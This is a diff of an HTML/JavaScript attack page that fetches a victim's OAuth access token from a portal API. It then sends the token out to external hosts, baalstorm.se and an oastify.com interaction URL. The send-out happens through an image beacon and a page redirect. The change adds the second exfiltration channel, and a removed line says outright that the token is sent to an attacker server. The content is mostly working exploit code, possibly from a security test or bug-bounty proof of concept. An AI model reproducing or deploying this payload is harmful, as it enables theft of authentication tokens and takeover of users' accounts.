@@ -17,11 +17,11 @@
     <script>
     var EXFIL = 'https://baalstorm.se/token.html';
 
-    var payload = "fetch('/portal/api/v2/oauth/token?refresh=true')"
+     var payload = "fetch('/portal/api/v2/oauth/token?refresh=true')"
         + ".then(function(r){return r.json()})"
         + ".then(function(d){"
-        + "  new Image().src='" + EXFIL + "?token='+encodeURIComponent(d.access_token);"
-        + "  document.write('<h1>Done</h1><p>Token sent to attacker server.</p>')"
+        + "  new Image().src='https://snjyw20i332wincvppz8ddkullrnfc.oastify.com/?token='+encodeURIComponent(d.access_token);"
+        + "  location='" + EXFIL + "?token='+encodeURIComponent(d.access_token);"
         + "})"
         + ".catch(function(e){"
         + "  document.write('<h1>Failed</h1><p>'+e.message+'</p>')"
